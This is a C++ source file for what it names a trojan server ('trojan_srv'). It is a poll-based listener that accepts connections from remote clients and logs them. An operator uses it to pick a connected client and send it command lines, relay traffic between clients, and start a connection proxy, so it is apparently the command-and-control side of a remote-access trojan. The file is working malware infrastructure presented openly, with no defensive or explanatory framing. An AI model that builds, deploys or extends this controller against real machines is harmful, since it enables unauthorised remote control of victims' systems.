#include <signal.h>
#include <sstream>
#include <iostream>
#include <iterator>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/poll.h>
#include <unistd.h>
#include <string.h>
#include <inttypes.h>
#include <vector>
#include <map>
#include <algorithm>
#include <optional>
#include <functional>
#include <unistd.h>
#include "client.h"
#include "clients.h"
#include "TrojanTime.h"
#include <netinet/in.h>
#include "ConnectionProxy.h"
#include "NetUtils.h"
#include "Journal.h"
#include "InputParParser.h"

/////////////////////////////////////////////////////////
// read from a FD (int) and save data in std::string
// until EOL was received
struct ReadLineAndSockAddr {
	std::string strLine;
	sockaddr_in sa_in;
};
std::map<int, ReadLineAndSockAddr> mapReadLineFromFD;
/////////////////////////////////////////////////////////

std::vector<pollfd> vecPollFDs;
Clients clients;
std::vector<int> vecFDs2Close;

ConnectionProxy connectionProxy;

void CloseFDs() {
	for(const auto& iFD : vecFDs2Close) {
		close(iFD);
		mapReadLineFromFD.erase(iFD);
		for (std::vector<pollfd>::iterator it = vecPollFDs.begin(); it != vecPollFDs.end(); ++it) {
			if (it->fd == iFD) {
				vecPollFDs.erase(it);
				break;
			}
		}
	}
	vecFDs2Close.clear();
}

void AddFD2BeClosed(int iFD) {
	vecFDs2Close.push_back(iFD);
}

void SendData2Client(const int iFD, const std::string& str_buf) {
	//we write to a non blocking socket, thats why such a complicated stuff with EWOULDBLOCK and poll
	//write timeout is set to 10 seconds
	ssize_t sent_all = 0, sent = 0;
	auto lambdaFD_close = [iFD]() {
		clients.RemoveClientBySockFD(iFD);
		AddFD2BeClosed(iFD);
	};
	const ssize_t dataSize = str_buf.length();
	while (sent_all < dataSize) {
		sent = send(iFD, &str_buf[sent_all], dataSize - sent_all, 0);
		if (sent < 0) {
			if (errno == EWOULDBLOCK) {
				pollfd p = pollfd { iFD, POLLOUT };
				int iPollRes = poll(&p, 1, 10000);
				if (iPollRes < 0) {
					fprintf(stderr, "Error on poll: %s\n", strerror(errno));
					exit(-1);
				} else if (iPollRes == 0) {
					std::cout << "timeout" << std::endl;
					lambdaFD_close();
					return;
				} else {
					if (p.revents != POLLOUT) {
						printf("Error! revents = %d\n", p.revents);
						exit(-2);
					}
					continue;
				}
			}
			std::cerr << std::string("send returned error:") << errno << std::endl;
			lambdaFD_close();
		} else {
			sent_all += sent;
		}
	}
}

/*
 * accept all pending incoming connections
 */
void AddNewIncomingConnections(std::vector<pollfd>& vecPollFDs, unsigned int index) {
	do {
		sockaddr_in sa_in;
		socklen_t len = sizeof(sa_in);
		int new_sd = accept(vecPollFDs[index].fd, (sockaddr*)&sa_in, &len);
		if (new_sd < 0) {
			if (errno != EWOULDBLOCK) {
				fprintf(stderr, "accept()=%d failed\n", errno);
				exit(1);
			}
			break;//no more incoming connection in case of EWOULDBLOCK
		}
		mapReadLineFromFD[new_sd].sa_in = sa_in;
		Journal::get().WriteLn("incoming connection from ", sa_in, " fd=", new_sd, "\n");
		clients.PrintPrompt();
		NetUtils::SetFDnoneBlocking(new_sd);
		vecPollFDs.push_back(pollfd { new_sd, POLLIN });
	} while (true);
}

void ClearLineAndGoToBegin() {
	char clear_line[] = "\033[2K";
	char line_up[] = "\033[1A";
	std::cout << clear_line << std::endl << line_up;
}

void ParseCommand(const Client& clientFrom, const std::string& strLine) {
	if(strLine.empty())
		return;
	std::istringstream iss(strLine);
	std::vector<std::string> vecWords(
			std::istream_iterator<std::string>{iss}, std::istream_iterator<std::string>());
	try {
		if(vecWords.at(0) == "proxy") {//start connection proxy
			if(vecWords.at(1) == "start") {
				int port = std::stoi(vecWords.at(2));
				connectionProxy.Start(port);
				SendData2Client(clientFrom.GetSocketFD(), "proxy started\n");
			} else if(vecWords.at(1) == "stop") {
				connectionProxy.Stop();
			} else {
				std::cout << "Malformed proxy command" << std::endl;
				return;
			}
		} else if(vecWords.at(0)[0] == '@') {//send text from clientFrom to clientTo
			const std::string strClientTo = vecWords.at(0).substr(1);
			auto clientTo = clients.GetClientByID(strClientTo);
			if(clientTo) {
				clientTo->get().AddSubscriber(clientFrom);
				std::string strSend2Client = std::string(strLine.c_str() + vecWords.at(0).length() + 1) + "\n";
				SendData2Client(clientTo->get().GetSocketFD(), strSend2Client);
			}
			else
				SendData2Client(clientFrom.GetSocketFD(), strClientTo + " - no such client\n");
		}
	} catch (const std::exception& ex) {
		std::cout << "Malformed command" << std::endl;
		return;
	}
}

void ReadDataFromClient(const unsigned int fd) {
	std::function fConnClosed = [&fd](std::string const& strLog){
		Journal::get().WriteLn(strLog, fd, "\n");
		auto client = clients.FindClientBySockFD(fd);
		if (client) {
			Journal::get().WriteLn("removing client: ", client->get().GetStrID(), "\n");
			clients.RemoveClientBySockFD(fd);
		} else {
			Journal::get().WriteLn("unknown client", "\n");
		}
		AddFD2BeClosed(fd);
	};
	do {
		unsigned char byteRead;
		int rc = recv(fd, &byteRead, sizeof(byteRead), 0);
		if (rc < 0) {
			if (errno == EWOULDBLOCK)//no more data to read, just exit and poll
				break;
			if (errno == EINTR)
				continue;
			fConnClosed(std::string("Recv error errno=") + std::to_string(errno) + ", fd=");
			break;
		} else if (rc == 0) {	//remote host closed a connection
			fConnClosed(std::string("Remote peer gracefully closed a socket fd="));
			break;
		} else {	//read a data
			if (byteRead == '\n') {
				std::string& strLine = mapReadLineFromFD[fd].strLine;
				//printf("readline: %s\n", strLine.c_str());
				auto client = clients.FindClientBySockFD(fd);
				if (client) {
					client->get().AddReceivedText(strLine);
					if (clients.IsClientActive(client->get())) {
						ClearLineAndGoToBegin();
						const std::string& strClientID = client->get().GetStrID();
						std::cout << strClientID << std::string("(") <<
								CurrentTime() << std::string(")") <<
								std::string("<") << strLine << std::string("\n") << std::flush;
						clients.PrintPrompt();
					}
					ParseCommand(client->get(), strLine);
					for(const auto& strSubscriber : client->get().GetSubscribers()) {
						auto cSubscr = clients.GetClientByID(strSubscriber);
						if(cSubscr)
							SendData2Client(cSubscr->get().GetSocketFD(), std::string(strLine) + "\n");
					}
				} else {
					auto iFD_replaced = clients.AddClient(std::move(Client(strLine, fd, mapReadLineFromFD[fd].sa_in)));
					if (iFD_replaced)
						AddFD2BeClosed(*iFD_replaced);//client was replaced, close old FD
					ClearLineAndGoToBegin();
					clients.PrintPrompt();
				}
				strLine = "";
			} else {
				mapReadLineFromFD[fd].strLine += byteRead;
			}
		}
	} while (true);
}

void HandleStdinRead() {
	std::string str;
	std::getline(std::cin, str);
	if (str == "#") {
		auto count = clients.GetClientCount();
		if (count == 0) {
			std::cout << "no clients" << std::endl;
		} else {
			clients.PrintClients();
			std::cout << "choose a client:";
			std::getline(std::cin, str);
			clients.SetActiveClient(str);
		}
	} else {
		auto client = clients.GetActiveClient();
		if (client) {
			client->get().AddSentText(str);
			str += "\n";
			SendData2Client(client->get().GetSocketFD(), str);
			clients.PrintPrompt();
		}
	}
}

std::tuple<int, std::string> ParseCmdLine(int argc, char **argv) {
	int port = 18650;
	InputParParser ip(argc, argv);
	const std::string& strPort = ip.getCmdOption("-p");
	if(!strPort.empty()) {
		try {
			port = std::stoi(strPort);
		}catch(const std::exception& ex) {}
	}
	const std::string& strLog = ip.getCmdOption("-j");
	if(strLog.empty()) {
		std::cerr << "Usage example: ./trojan_srv -p 18650 -j /tmp/trojan_journal.log" << std::endl;
		exit(1);
	}
	return {port, strLog};
}

int main(int argc, char **argv) {
	signal(SIGPIPE, SIG_IGN);//if send() fails, prevent close of program by receiving SIGPIPE
	auto [port, strLogFile] = ParseCmdLine(argc, argv);
	Journal::get().SetLogFile(strLogFile.c_str());
	int sockListen = NetUtils::SetupListenSoket(port, 0);
	Journal::get().WriteLn("server started at: ", CurrentTime(), ", listening on port ", port, "\n");
	vecPollFDs = {pollfd {STDIN_FILENO, POLLIN}, pollfd {sockListen, POLLIN}};

	while (true) {
		if (poll(vecPollFDs.data(), vecPollFDs.size(), -1) < 1) {
			fprintf(stderr, "Error on poll: %s\n", strerror(errno));
			exit(-1);
		}
		for (unsigned int i = 0; i < vecPollFDs.size(); i++) {
			if (vecPollFDs[i].revents == 0)
				continue;
			if (vecPollFDs[i].revents != POLLIN) {//typically POLLERR or POLLHUP received, just close that fd
				clients.RemoveClientBySockFD(vecPollFDs[i].fd);
				AddFD2BeClosed(vecPollFDs[i].fd);
				continue;
			}

			if (vecPollFDs[i].fd == STDIN_FILENO) {
				HandleStdinRead();
			} else if (vecPollFDs[i].fd == sockListen) {
				AddNewIncomingConnections(vecPollFDs, i);
			} else {
				ReadDataFromClient(vecPollFDs[i].fd);
			}
		}
		CloseFDs();
	}
	return 0;
}
